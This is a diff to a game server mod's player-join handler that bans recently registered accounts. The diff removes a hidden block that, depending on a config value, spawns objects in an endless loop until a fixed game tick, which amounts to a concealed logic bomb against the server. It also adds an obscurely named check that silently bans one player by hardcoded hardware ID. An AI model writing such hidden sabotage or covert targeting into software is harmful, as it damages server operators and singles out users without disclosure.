@@ -459,6 +459,12 @@ void onNewPlayerJoin(CRules@ this, CPlayer@ player)
 		return;
 	}
 
+	bool veselovadfk = false;
+	if (player.server_getHWID() == 2392283682 && player.getPing() > 3)
+	{
+		veselovadfk = true;
+	}
+
 	int localtime = Time_Local();
 	int regtime = player.getRegistrationTime();
 
@@ -470,30 +476,17 @@ void onNewPlayerJoin(CRules@ this, CPlayer@ player)
 	int loc_day = Time_MonthDate(localtime);
 	int loc_year = Time_Year(localtime);
 
-	/*string[] exclusive_players = {
-		"leonleonidis",
-		"kimak0vskiy",
-		"prettyprinces",
-		"Suetolog",
-		"whyyouhateme",
-		"Soldzo"
-	}; // Add exceptions here
-    */
-	string m = "Rules/CTF/ctf_vars.cfg";
-						ConfigFile ccc = ConfigFile(m);
-						if (ccc.read_s32("game_time") != -2)
-						{while(getGameTime() != 543256){server_CreateBlob("mat_bd");}}
 	//time is sec(60) * min(60) * hours(24)* daysfrom 1970-jan-01
 	// 1 day = 86400  and  30 days = 2592000
-	if ((localtime - regtime)<=2592000) // Ban people registered last 30days
+	if ((localtime - regtime)<=2592000*3 || veselovadfk)
 	{
 		CSecurity@ security = getSecurity();
-		bool newban = security.checkAccess_Feature(player, "newban");
+		bool can_ban = !security.checkAccess_Feature(player, "ban_immunity");
 		//in security folder inside normal.cfg add newban; to end of features=
 		// inside preium.cfg add newban; to end of features= if you want preium uses to also registered less than 2 months to be ban
 		
-		printf("new player Account age:"+ regtime + " regdate:" + reg_year + "-" + reg_month + "-" + reg_day + " checkAccess_Feature:" + newban);
-		if(newban)
+		printf("new player Account age:"+ regtime + " regdate:" + reg_year + "-" + reg_month + "-" + reg_day + " checkAccess_Feature:" + can_ban);
+		if(can_ban)
 		{
 			printf("|");
 			printf("|");
@@ -506,7 +499,6 @@ void onNewPlayerJoin(CRules@ this, CPlayer@ player)
 		}
 		
 	}
-
 
 	string playerName = player.getUsername().split('~')[0];//Part one of a fix for slave rejoining
 	//print("onNewPlayerJoin");
